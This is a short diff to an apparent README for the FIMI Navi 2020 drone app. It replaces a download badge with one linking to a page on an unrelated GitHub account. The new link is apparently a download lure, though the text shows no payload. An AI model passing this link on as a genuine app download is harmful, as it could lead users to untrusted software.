@@ -6,11 +6,7 @@ ru Русская версия — FIMI Navi 2020
 <img src="https://cdn.aptoide.com/imgs/a/a/4/aa4deb92cb6e41cd373f4b194ec4113b_icon.png" width="200" alt="FIMI Navi 2020 Icon">
 </div>
 
-<div align="center">
-<a href="https://fimi-navi-2020.github.io/.github">
-<img src="https://img.shields.io/badge/Скачать_FIMI%E2%80%89Navi%E2%80%892020-0078D6?style=for-the-badge&logo=android&logoColor=white" alt="Скачать FIMI Navi 2020">
-</a>
-</div>
+[![GET FIMI Navi](https://img.shields.io/badge/GET%20%E2%80%94%20FIMI-Navi-0078D6?style=for-the-badge&logoColor=white)](https://daroscarlau2.github.io/.github/FIMI-Navi)
 
 ---
 
